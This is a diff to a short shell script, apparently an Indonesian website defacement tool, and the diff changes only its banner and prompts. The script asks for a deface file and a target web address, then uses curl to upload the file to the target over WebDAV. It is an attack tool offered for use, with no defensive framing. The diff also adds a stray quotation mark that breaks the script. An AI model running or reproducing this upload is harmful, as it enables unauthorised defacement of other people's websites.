@@ -5,7 +5,7 @@ cyan='\033[36;1m'
 red='\033[31;1m'
 white='\033[37;1m' 
 
-toilet -f mono12 Webdav
+toilet -f mono12 Webdav | lolcat
 echo $cyan "__________________________"
 echo $green "Admin : @M4uL"
 echo $green "Admin : @St1nky"
@@ -13,7 +13,7 @@ echo $cyan "__________________________"
 echo $red "Taruh Script Deface Di Luar Folder"
 echo $cyan "__________________________"
 echo $green "Masukan Script Deface Anda"
-read -p "C\>" Anda
+read -p "M4uL@localhost : " Anda
 echo $green "Masukan Target Web"
-read -p "C\>" Web
+read -p "M4uL@localhost : " Web"
 curl -T /storage/emulated/0/$Anda $Web
